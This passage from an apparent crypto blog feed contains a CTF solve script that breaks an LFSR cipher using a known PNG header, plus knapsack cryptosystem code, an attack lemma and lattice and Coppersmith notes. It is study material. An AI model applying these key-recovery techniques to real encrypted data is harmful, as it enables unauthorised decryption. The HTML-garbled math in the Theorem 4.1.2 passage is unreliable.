feedback)</span><br><span class="line">            byte += str(lastbit)</span><br><span class="line">        <span class="keyword">return</span> (cur, int(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = open(<span class="string">'lfsr.png.encrypt'</span>, <span class="string">"rb"</span>).read()</span><br><span class="line">    <span class="comment"># kpa_attack for length(hex) &lt;= 24</span></span><br><span class="line">    stream = init_stream(<span class="string">'89504E470D0A1A0A0000000D'</span>,</span><br><span class="line">                         <span class="string">'e63b037e74c01aeefd6552ef'</span>)</span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> range(<span class="number">2</span>, len(stream) // <span class="number">2</span>):</span><br><span class="line">        key, feedback = crack_key(stream, key_length)</span><br><span class="line">        <span class="keyword">if</span> (key, feedback) != (<span class="literal">False</span>, <span class="literal">False</span>):</span><br><span class="line">            cur = key</span><br><span class="line">            fw = open(<span class="string">'lsfr_&#123;&#125;.png'</span>.format(key_length), <span class="string">'wb'</span>)</span><br><span class="line">            plain = <span class="string">b''</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">                cur, byte = get_byte(cur, feedback)</span><br><span class="line">                plain += bytes([cipher[i] ^ byte])</span><br><span class="line">            fw.write(plain)</span><br><span class="line">            fw.close()</span><br><span class="line">            print(<span class="string">'lsfr_&#123;&#125;.png ok!'</span>.format(key_length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h4><p>exp对应2020i春秋公益赛的一道lfsr-kpa（已知png文件头，与cipher异或即可将问题转化为lfsr-kpa问题）</p><p>lfsr-kpa可以不局限于开头，密钥流中任意段已知2n个bit均可进行抽头序列的猜测（lfsr在已知n个连续比特和抽头序列的情况下一定能恢复完整密钥流）</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About Knapsack</title>
      <link href="/2020/03/02/About-Knapsack/"/>
      <url>/2020/03/02/About-Knapsack/</url>
      
        <content type="html"><![CDATA[<h3 id="Basis"><a href="#Basis" class="headerlink" title="Basis"></a>Basis</h3><p>基于子集和问题 - $a_{1}x_{1}+…+a_{n}x_{n}=E;\quad x_{i}\in\{0,1\}.$</p><p>Proved to be NP-hard.</p><p>但Merkle-Hellman cryptosystem存在trapdoor.</p><h4 id="Merkle-Hellman-cryptosystem"><a href="#Merkle-Hellman-cryptosystem" class="headerlink" title="Merkle-Hellman cryptosystem"></a>Merkle-Hellman cryptosystem</h4><p><strong>Key-Generation</strong></p><p>有随机超递增序列$w=(w_{1},w_{2},…,w_{n})$，随机数$q&gt;\sum w_{i}$及随机数r (gcd(r, q) = 1)</p><p>即定义序列$\beta$中的元素$\beta_{i}\equiv rw_{i}(mod\ q),i\in[1,n]$. 公钥$\beta$，私钥$(w,q,r)$.</p><p><strong>Encryption</strong></p><p>n-bit明文$\alpha=(\alpha_{1},\alpha_{2},…,\alpha_{n})$. 密文$c=\sum\alpha_{i}\beta_{i}$.</p><p><strong>Decryption</strong></p><p>$c’\equiv cr^{-1}\equiv \sum\alpha_{i}w_{i}(mod\ q)$.</p><p>则由$\sum\alpha_{i}w_{i}&lt;q$及超递增序列w易知，令j从n-1到0，背包当前容量为c时，</p><p>(1) $c&lt;w[j]\rightarrow m[j]=0,j—;$</p><p>(2) $c\geq w[j]\rightarrow m[j]=1,c-=w[j],j—;$</p><p>即可恢复出明文m.</p><p><strong>More Version</strong></p><p>选取一个permutation $\pi$，在生成的$\beta$序列后，再令$\beta’_{i}=\beta_{\pi(i)}$. 公开序列则为$\beta’$. 持有私钥加入$\pi$.</p><h3 id="The-Multiple-Knapsack-Cryptosystem"><a href="#The-Multiple-Knapsack-Cryptosystem" class="headerlink" title="The Multiple Knapsack Cryptosystem"></a>The Multiple Knapsack Cryptosystem</h3><h4 id="Key-Generation"><a href="#Key-Generation" class="headerlink" title="Key-Generation"></a>Key-Generation</h4><p>私钥 - 六元组$(A,B,E,p,u,v)$，公钥 - 三元组$(F,G,H)$.</p><p>其中私钥$A(\{a_i\}),B(\{b_i\}),C(\{c_i\})$满足Condition 1, 2：</p><p><strong>Condition 1.</strong></p><script type="math/tex; mode=display">a_{k}\leq \sum_{i=1}^{k-1}a_{i},b_{k}\leq \sum_{i=1}^{k-1}b_{i}\quad (\forall k\in\{2,3,...,n\}).</script><p><strong>Condition 2.</strong></p><script type="math/tex; mode=display">e_{k}>-a_{k}b_{k}+(\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})+(\sum_{i=1}^{k-1}e_{i})\\-b_{1}(2^{n-1}-2^{k-1})(a_{k}-\sum_{i=1}^{k-1}a_{i})-a_{1}(2^{n-1}-2^{k-1})(b_{k}-\sum_{i=1}^{k-1}b_{i}).</script><p>[Q] - paper里提出的是$a_{1}(2^{n-1}-2^{k-1})(a_{k}-\sum_{i=1}^{k-1}a_{i})$及$b_{1}…$，但decryption原理推导时，个人感觉存在一定问题…故此处与paper不一.</p><p><strong>Algorithm (Generate A,B,E)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenPriKnapsack</span><span class="params">(n)</span>:</span></span><br><span class="line">    a1, b1, e1 = getRandomNBitInteger(<span class="number">16</span>), getRandomNBitInteger(<span class="number">16</span>), getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">    A, B, E = [a1], [b1], [e1]</span><br><span class="line">    a, b, e = a1, b1, e1</span><br><span class="line">    sum_a, sum_b, sum_e = a, b, e</span><br><span class="line">    tmp = <span class="number">2</span> ** (n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">        a = getRandomRange(sum_a // <span class="number">2</span>, sum_a)</span><br><span class="line">        b = getRandomRange(sum_b // <span class="number">2</span>, sum_b)</span><br><span class="line">        met = -a * b + sum_a * sum_b + sum_e - (tmp - <span class="number">2</span> ** (i + <span class="number">1</span>)) * (b1 * (a - sum_a) + a1 * (b - sum_b))</span><br><span class="line">        e = met + getRandomRange(<span class="number">2</span>**<span class="number">8</span>, <span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line">        sum_a += a</span><br><span class="line">        sum_b += b</span><br><span class="line">        sum_e += e</span><br><span class="line">        A.append(a)</span><br><span class="line">        B.append(b)</span><br><span class="line">        E.append(e)</span><br><span class="line">    <span class="keyword">return</span> A, B, E</span><br></pre></td></tr></table></figure><p>由Condition 1我们有$a_{k}b_{k}\leq (\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})$，且能由此和Condition 2推出$e_{k}&gt;\sum_{i=1}^{k-1}e_{i}$. (Superincreasing)</p><p><strong>Algorithm (Generate p,u,v)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = (sum_a * sum_b + sum_e) + getRandomRange(<span class="number">2</span>**<span class="number">8</span>, <span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line">s = size(p) // <span class="number">2</span></span><br><span class="line">u, v = getPrime(s), getPrime(s)</span><br><span class="line"><span class="keyword">while</span> GCD(u, p) != <span class="number">1</span> <span class="keyword">or</span> GCD(v, p) != <span class="number">1</span>:</span><br><span class="line">    u, v = getPrime(s), getPrime(s)</span><br></pre></td></tr></table></figure><p><strong>Algorithm (Generate F,G,H)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F = [(u * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> A]</span><br><span class="line">G = [(v * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> B]</span><br><span class="line">H = [(u * v * _) % p <span class="keyword">for</span> _ <span class="keyword">in</span> E]</span><br></pre></td></tr></table></figure><h4 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h4><p>$M=(m_{1},m_{2},…,m_{n})$，有$C:=(\sum_{i=1}^{n}f_{i}m_{i})(\sum_{i=1}^{n}g_{i}m_{i})+\sum_{i=1}^{n}h_{i}m_{i}$.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(pubkey, m)</span>:</span></span><br><span class="line">    F, G, H = pubkey</span><br><span class="line">    n = len(F)</span><br><span class="line">    m = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(bytes_to_long(m))[<span class="number">2</span>:]]</span><br><span class="line">    m = [<span class="number">0</span>] * ((<span class="number">8</span> - len(m) % <span class="number">8</span>) % <span class="number">8</span>) + m</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m), n):</span><br><span class="line">        block_m = m[i : i + n]</span><br><span class="line">        <span class="keyword">if</span> len(block_m) != n:</span><br><span class="line">            padding = [getRandomRange(<span class="number">0</span>, <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n - len(block_m))]</span><br><span class="line">            block_m += padding</span><br><span class="line">        fm, gm, hm = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            fm += F[i] * block_m[i]</span><br><span class="line">            gm += G[i] * block_m[i]</span><br><span class="line">            hm += H[i] * block_m[i]</span><br><span class="line">        block_c = fm * gm + hm</span><br><span class="line">        c.append(hex(block_c)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h4 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h4><p>$D(C):=u^{-1}v^{-1}C(mod\ p)=(\sum_{i=1}^{n}a_{i}m_{i})(\sum_{i=1}^{n}b_{i}m_{i})+\sum_{i=1}^{n}e_{i}m_{i}$.</p><p>由Condition 1. 知，$\sum_{i=1}^{k}a_{i}\leq 2^{k-1}a_{1},\sum_{i=1}^{k}b_{i}\leq 2^{k-1}b_{1}$，有</p><p>$\because\sum_{i=1}^{k}a_{i}=2^{k-1}a_{1}-\Delta\quad\therefore\sum_{i=1}^{n}a_{i}\leq 2^{n-1}a_{1}-2^{n-k}\Delta$.</p><p>$\therefore\sum_{i=k+1}^{n}a_{i}=\sum_{i=1}^{n}a_{i}-\sum_{i=1}^{k}a_{i}\leq a_{1}(2^{n-1}-2^{k-1})$. 同理$\sum_{i=k+1}^{n}b_{i}\leq b_{1}(2^{n-1}-2^{k-1})$.</p><p>又由$(a_{k}-\sum_{i=1}^{k-1}a_{i})\leq 0,(b_{k}-\sum_{i=1}^{k-1}b_{i})\leq 0$及Condition 2. 知，</p><script type="math/tex; mode=display">e_{k}+a_{k}b_{k}-(\sum_{i=1}^{k-1}a_{i})(\sum_{i=1}^{k-1}b_{i})-(\sum_{i=1}^{k-1}e_{i})\\+(\sum_{i=k+1}^{n}b_{i})(a_{k}-\sum_{i=1}^{k-1}a_{i})+(\sum_{i=k+1}^{n}a_{i})(b_{k}-\sum_{i=1}^{k-1}b_{i})>0.</script><p>可知上式为下式的充分条件</p><script type="math/tex; mode=display">e_{k}+a_{k}b_{k}-(\sum_{i=1}^{k-1}a_{i}m_{i})(\sum_{i=1}^{k-1}b_{i}m_{i})-(\sum_{i=1}^{k-1}e_{i}m_{i})\\+(\sum_{i=k+1}^{n}b_{i}m_{i})(a_{k}-\sum_{i=1}^{k-1}a_{i}m_{i})+(\sum_{i=k+1}^{n}a_{i}m_{i})(b_{k}-\sum_{i=1}^{k-1}b_{i}m_{i})>0.</script><p>又等价为</p><script type="math/tex; mode=display">(\sum_{i=k+1}^{n}a_{i}m_{i}+\sum_{i=1}^{k-1}a_{i}m_{i})(\sum_{i=k+1}^{n}b_{i}m_{i}+\sum_{i=1}^{k-1}b_{i}m_{i})+(\sum_{i=k+1}^{n}e_{i}m_{i}+\sum_{i=1}^{k-1}e_{i}m_{i})\\<(\sum_{i=k+1}^{n}a_{i}m_{i}+a_{k})(\sum_{i=k+1}^{n}b_{i}m_{i}+b_{k})+(\sum_{i=k+1}^{n}e_{i}m_{i}+e_{k})\tag{1}</script><p>且在$m_{k}=1$时，有另一显然成立的不等式如下</p><script type="math/tex; mode=display">D(C)=(\sum_{i=1}^{n}a_{i}m_{i})(\sum_{i=1}^{n}b_{i}m_{i})+\sum_{i=1}^{n}e_{i}m_{i}\\\geq(\sum_{i=k+1}^{n}a_{i}m_{i}+a_{k})(\sum_{i=k+1}^{n}b_{i}m_{i}+b_{k})+(\sum_{i=k+1}^{n}e_{i}m_{i}+e_{k})\tag{2}</script><p>由(1)(2)有以下解密算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(prikey, c)</span>:</span></span><br><span class="line">    A, B, E, u, v, p = prikey</span><br><span class="line">    n = len(A)</span><br><span class="line">    u_inv = inverse(u, p)</span><br><span class="line">    v_inv = inverse(v, p)</span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> block_c <span class="keyword">in</span> c:</span><br><span class="line">        block_m = <span class="string">""</span></span><br><span class="line">        Dc = (u_inv * v_inv * int(block_c, <span class="number">16</span>)) % p</span><br><span class="line">        am, bm, em = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            d = (am + A[k]) * (bm + B[k]) + (em + E[k])</span><br><span class="line">            <span class="keyword">if</span> Dc &gt;= d:</span><br><span class="line">                block_m += <span class="string">"1"</span></span><br><span class="line">                am += A[k]</span><br><span class="line">                bm += B[k]</span><br><span class="line">                em += E[k]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                block_m += <span class="string">"0"</span></span><br><span class="line">        m = m + block_m[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(int(m, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="Code-For-Test"><a href="#Code-For-Test" class="headerlink" title="Code For Test"></a>Code For Test</h4><p><a href="MKS.py">MKS.py</a></p><h3 id="Attack-on-the-MKS-Cryptosystem"><a href="#Attack-on-the-MKS-Cryptosystem" class="headerlink" title="Attack on the MKS Cryptosystem"></a>Attack on the MKS Cryptosystem</h3><p>由于私钥A，B具有相同的非超递增性质，所以证其一即可，我们令m为一小于n的正整数，定义以下在$N^{m}$上的向量：</p><script type="math/tex; mode=display">f=(f_{1},...,f_{m}),a=(a_{1},...,a_{m})</script><p>由于攻击者仅知公钥F部分，未知私钥A，但有同余关系$f\equiv ua(mod\ p)$，因此给出以下引理：</p><h4 id="Lemma-1"><a href="#Lemma-1" class="headerlink" title="Lemma 1"></a>Lemma 1</h4><p>令向量$x\in Z^{m}$，若$x\perp f$，则有$x\perp a$或$|x|\geq \frac{p}{|a|}$.</p><p><strong>Proof.</strong> 有$<x,f>\equiv 0(mod\ p)$，若假设x不与a正交，则有$|<x,a>|\geq p$（因为$gcd(u,p)=1$），再由柯西不等式可知$P\leq |x||a|$.</x,a></x,f></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lattice-Learning-2</title>
      <link href="/2020/02/29/Lattice-Learning-2/"/>
      <url>/2020/02/29/Lattice-Learning-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-3-Algorithm-for-the-Closest-and-Shortest-Vector-Problems"><a href="#Chapter-3-Algorithm-for-the-Closest-and-Shortest-Vector-Problems" class="headerlink" title="Chapter 3    Algorithm for the Closest and Shortest Vector Problems"></a>Chapter 3    Algorithm for the Closest and Shortest Vector Problems</h2><h3 id="3-1-Babai’s-Rounding-Technique"><a href="#3-1-Babai’s-Rounding-Technique" class="headerlink" title="3.1    Babai’s Rounding Technique"></a>3.1    Babai’s Rounding Technique</h3><p><strong>Theorem 3.1.1.</strong> Given a vector we can write $\underline{\omega}=\sum_{i=1}^{n}\alpha_{i}\underline{b_{i}}$ with $\alpha_{i}\in R$. The rounding technique is simply to set</p><script type="math/tex; mode=display">\underline{v}=\sum_{i=1}^{n}\lfloor \alpha_{i}\rceil\underline{b_{i}}</script><p>$\left|\underline{v}-\underline{w}\right|$ is within an exponential factor of the minimal value if the basis is LLL-Reduced. The method trivially generalises to non-full-rank lattices as long as $\underline{\omega}$ lies in the R-span of the basis.</p><p><strong>Theorem 3.1.2.</strong> Let $\{\underline{b}_{1},…,\underline{b}_{n}\}$ be an LLL-Reduced basis (with factor $\delta=\frac{3}{4}$) for a Lattice $L\subset R^{n}$. Then the output $\underline{v}$ of the Babai rounding method on input $\underline{\omega}\in R^{n}$ satisfies</p><script type="math/tex; mode=display">\left\|\underline{\omega}-\underline{v}\right\|\leq (1+2n(9/2)^{n/2})\left\|\underline{\omega}-\underline{u}\right\|</script><p>for all $\underline{u}\in L$.</p><h3 id="3-2-The-Embedding-Technique"><a href="#3-2-The-Embedding-Technique" class="headerlink" title="3.2    The Embedding Technique"></a>3.2    The Embedding Technique</h3><p><strong>Theorem 3.2.1.</strong> Embedding’s solution to the CVP  corresponds to integers $l_{1},…,l_{n}$ such that</p><script type="math/tex; mode=display">\underline{\omega}\approx\sum_{i=1}^{n}l_{i}\underline{b_{i}}</script><p>The idea is to define a lattice L’ that contains the short vector $\underline{e}(\underline{e}=\underline{\omega}-\sum_{i=1}^{n}l_{i}\underline{b_{i}})$. Let $M\in R_{&gt;0}$ (usually let M=1). The lattice L’ is defined by the vectors (which are a basis for $R^{n+1}$)</p><script type="math/tex; mode=display">(\underline{b_{1}},0),...,(\underline{b_{n}},0),(\underline{\omega},M)</script><p>Hence, we might be able to find $\underline{e}$ by solving the SVP problem in the lattice L’. Then we can solve the CVP by subtracting $\underline{e}$ from $\underline{\omega}$.</p><p>Example: the CVP whose basis is for $R^{1}$</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001321511.png" alt></p><p>add $(\underline{\omega},M)$ to define L’ in $R^{2}$</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001737673.png" alt></p><p>solving the SVP to find $\delta$</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-2/image-20200302001826288.png" alt></p><p><strong>Lemma 3.2.2.</strong> Let $\{\underline{b}_{1},…,\underline{b}_{n}\}$ be a basis for a lattice $L\subset Z^{n}$ and donate by $\lambda_1$ the shortest Euclidean length of a non-zero element of L. Let $\underline{\omega}\in R^{n}$ and let $\underline{v}\in L$ be a closest lattice point to $\underline{\omega}$. Define $\underline{e}=\underline{\omega}-\underline{v}$. Suppose that $\left|\underline{e}\right|&lt;\lambda_1/2$ and let $M=\left|\underline{e}\right|$. Then $(\underline{e},M)$ is a shortest non-zero vector in the lattice L’ of the embedding technique.</p><p>Proof: All vectors in L’ are of the form</p><script type="math/tex; mode=display">l_{n+1}(\underline{e},M)+\sum_{i=1}^{n}l_{i}(\underline{b}_{1},0)</script><p>for some $l_{i}\in Z$. It is clear that every non-zero vector with $l_{n+1}=0$ is of length at least $\lambda_{1}$.</p><p>Since $\left|(\underline{e},M)\right|^{2}=\left|\underline{e}\right|^{2}+M^{2}=2M^{2}&lt;\frac{\lambda^{2}}{2}$, the vector $(\underline{e},M)$ has length at most $\frac{\lambda_1}{\sqrt{2}}$. Since $\underline{v}$ is a closest vector to $\underline{\omega}$ in the lattice L, $\forall_{\underline{x}\in L},s.t.\left|\underline{e}\right|\leq \left|\underline{e}+\underline{x}\right|$. SVP’s correctness proved.</p><h3 id="3-3-Korkine-Zolotarev-Bases"><a href="#3-3-Korkine-Zolotarev-Bases" class="headerlink" title="3.3    Korkine-Zolotarev Bases"></a>3.3    Korkine-Zolotarev Bases</h3><blockquote><p>Schnorr has developed the block Korkine-Zolotarev lattice basis reduction algorithm, which computes a Korkine-Zolotarev basis for small dimensional projections of the original lattice and combines this with the LLL algorithm. The output basis can be proved to be of a better quality than an LLL-reduced basis. This is the most powerful algorithm for fifinding short vectors in lattices of large dimension. </p></blockquote><h2 id="Chapter-4-Coppersmith’s-Method-and-Related-Applications"><a href="#Chapter-4-Coppersmith’s-Method-and-Related-Applications" class="headerlink" title="Chapter 4    Coppersmith’s Method and Related Applications"></a>Chapter 4    Coppersmith’s Method and Related Applications</h2><h3 id="4-1-Coppersmith’s-Method-for-Modular-Univariate-Polynomials"><a href="#4-1-Coppersmith’s-Method-for-Modular-Univariate-Polynomials" class="headerlink" title="4.1    Coppersmith’s Method for Modular Univariate Polynomials"></a>4.1    Coppersmith’s Method for Modular Univariate Polynomials</h3><h4 id="4-1-1-First-Steps-to-Coppersmith’s-Method"><a href="#4-1-1-First-Steps-to-Coppersmith’s-Method" class="headerlink" title="4.1.1    First Steps to Coppersmith’s Method"></a>4.1.1    First Steps to Coppersmith’s Method</h4><p>Let $F(x)=x^{d}+a_{d-1}x^{d-1}+…+a_{1}x+a_{0}$ be a monic polynomial of degree d with integer coefficients. Suppose we know that there exist one or more integers $x_{0}$ such that $F(x)\equiv 0(mod\ M)$ and that $x_{0}&lt;M^{\frac{1}{d}}$. The problem is to find all such roots.</p><p>Since $|x_{0}^{i}|&lt;M$ for all $0\leq i\leq d$ then, if the coefficients of F(x) are small enough, one might have $F(x_{0})=0$ over Z. In this case, the problem can be easily solved by Newton’s method (round the approximations of the roots to the nearest integer and check whether they are solutions of F(x)). However, we wanna deal with polynomials F(x) having a small solution but whose coefficients are not small.</p><p>Coppersmith’s idea is to build from F(x)  a polynomial <strong>G(x)</strong> that still has the same solution $x_{0}$, but which has <strong>coefficients small enough</strong>.</p><p><strong>Theorem 4.1.1.</strong> (Howgrave-Graham [296]) Let $M, X\in N$ and let $F(x)=\sum_{i=0}^{d}a_{i}x^{i}\in Z[x]$. Suppose $x_{0}\in Z$ is a solution to $F(x)\equiv 0(mod\ M)$ such that $|x_{0}|&lt;X$. We associate with the polynomial F(x) the row vector $b_F=(a_0,a_{1}X,a_{2}X^{2},…,a_{d}X^{d})$. If $\left|b_{F}\right|&lt;\frac{M}{\sqrt{d+1}}$ then $F(x_{0})=0$.</p><p><strong>Proof:</strong> Cauchy-Schwarz inequality $\rightarrow\sum_{i=1}^{n}x_{i}\leq \sqrt{n\sum_{i=1}^{n}x_{i}^{2}}$.</p><p>So, $|F(x_{0})|=|\sum_{i=0}^{d}a_{i}x_{0}^{i}|\leq \sum_{i=0}^{d}|a_{i}||x_{0}|^{i}\leq \sum_{i=0}^{d}|a_{i}|X^{i}\leq \sqrt{d+1}\left|b_{F}\right|&lt;\sqrt{d+1}\frac{M}{\sqrt{d+1}}=M$.</p><p>$\therefore F(x_{0})=0$.</p><p>Then how to transform F(x) to G(x) we need?</p><p>To do this, consider the d+1 polynomials $G_{i}(x)=Mx^{i}$ for $0\leq i&lt;d$ and F(x). They all have the solution $x=x_{0}$ module M. Define the lattice L with the basis B</p><script type="math/tex; mode=display">B=\left( \begin{matrix}   M & 0 & ... & 0 & 0 \\   0 & MX & ... & 0 & 0 \\   ... & ... & ... & ... & ... \\   0 & 0 & ... & MX^{d-1} & 0 \\   a_0 & a_1X & ... & a_{d-1}X^{d-1} & X^{d}  \end{matrix} \right).</script><p><strong>Theorem 4.1.2.</strong> Let G(x) be the polynomial corresponding to the first vector $\underline{b}_{1}$ in the LLL-Reduced basis for L. Set $c_{1}(d)=2^{-\frac{1}{2}}(d+1)^{-\frac{1}{d}}$. If $X<c_{1}(d)\cdot m^{\frac{2}{d(d+1)}}$ then any root $x_{0}$ of f(x) module m such that $|x_{0}|\leq x$ satisfies $g(x_{0})="0$" in z. (i.e., if $\sqrt{d+1}\cdot 2^{\frac{d}{4}}\cdot x^{\frac{d}{2}}<m^{\frac{1}nan}$, …)< p><h4 id="4-1-2-The-Full-Coppersmith-Method"><a href="#4-1-2-The-Full-Coppersmith-Method" class="headerlink" title="4.1.2    The Full Coppersmith Method"></a>4.1.2    The Full Coppersmith Method</h4><p>Compared to previous section, some benefits can be obtained by using x-shifts. (Get larger X)</p><p><strong>Theorem 4.1.3.</strong> (Coppersmith) Let $0&lt;\epsilon&lt;min\{0.18,\frac{1}{d}\}$. Let F(x) be a monic polynomial of degree d with one or more small roots $x_{0}$ module M such that $|x_{0}|&lt;\frac{1}{2}M^{\frac{1}{d}-\epsilon}$. Then $x_{0}$ can be found in time bounded by a polynomial in d, $\frac{1}{\epsilon}$ and log(M).</p><h3 id="4-2-Multivariate-Modular-Polynomial-Equations"><a href="#4-2-Multivariate-Modular-Polynomial-Equations" class="headerlink" title="4.2    Multivariate Modular Polynomial Equations"></a>4.2    Multivariate Modular Polynomial Equations</h3><p><strong>Theorem 4.2.1.</strong> Let $F(x,y)\in Z[x,y]$ be a polynomial of total degree d (i.e., every monomial $x^{i}y^{j}$ satisfies $i+j\leq d$). Let $X,Y,M\in N$ be such that $XY<M^{\frac{1}{d}-\epsilon}$ for some $0<\epsilon <\frac{1}{d}$. then one can compute (in time polynomial in log(m) and $\frac{1}{\epsilon}>d$) polynomials $F_{1}(x,y),F_{2}(x,y)\in Z[x,y]$ such that, for all $(x_{0},y_{0})\in Z^{2}$ with $|x_{0}|&lt;X,|y_{0}|&lt;Y$ and $F(x_{0},y_{0})\equiv 0(mod\ M)$, one has $F_{1}(x_{0},y_{0})=F_{2}(x_{0},y_{0})=0$ over Z.</M^{\frac{1}{d}-\epsilon}$></p><h3 id="4-3-Bivariate-Integer-Polynomials"><a href="#4-3-Bivariate-Integer-Polynomials" class="headerlink" title="4.3    Bivariate Integer Polynomials"></a>4.3    Bivariate Integer Polynomials</h3><p><strong>Theorem 4.3.1.</strong> Let $F(x,y)\in Z[x,y]$ and let $d\in N$ be such that $deg_{x}(F(x,y)),deg_{y}(F(x,y))\leq d$. Write</p><script type="math/tex; mode=display">F(x,y)=\sum_{0\leq i,j\leq d}F_{i,j}x^{i}y^{j}</script><p>For $X,Y\in N$, we define</p><script type="math/tex; mode=display">W=max_{0\leq i,j\leq d}|F_{i,j}|X^{i}Y^{j}</script><p>If $XY&lt;W^{\frac{2}{3d}}$ then there is an algorithm that takes as input F(x,y),X,Y, runs in time (bit operations) bounded by a polynomial in log(W) and $2^{d}$, and outputs all pairs $(x_{0},y_{0})\in Z^{2}$ such that $F(x_{0},y_{0})=0,|x_0|\leq X,|y_0|\leq Y$.</p><h3 id="4-4-Some-Applications-of-Coppersmith’s-method"><a href="#4-4-Some-Applications-of-Coppersmith’s-method" class="headerlink" title="4.4    Some Applications of Coppersmith’s method"></a>4.4    Some Applications of Coppersmith’s method</h3><h4 id="4-4-1-Fixed-Padding-Schemes-in-RSA"><a href="#4-4-1-Fixed-Padding-Schemes-in-RSA" class="headerlink" title="4.4.1     Fixed Padding Schemes in RSA"></a>4.4.1     Fixed Padding Schemes in RSA</h4><p>It is necessary to use padding schemes for RSA encryption and one simple proposal for k-bit RSA moduli is to take a k’ bit message and pad it by putting (k-k’-1) ones to the left hand side of it. This padding scheme is sometimes called <strong>fixed pattern padding</strong>.</p><script type="math/tex; mode=display">F(x)=(2^{k}-2^{k'}+x)^{e}-c\equiv 0(mod\ N)</script><p>Then if $|x|&lt;\frac{1}{2}N^{\frac{1}{e}}(k’&lt;\frac{k}{e}-1)$, Coppersmith’s method can solve it in polynomial time.</p><h4 id="4-4-2-Factoring-N-pq-with-Partial-Knowledge-of-p"><a href="#4-4-2-Factoring-N-pq-with-Partial-Knowledge-of-p" class="headerlink" 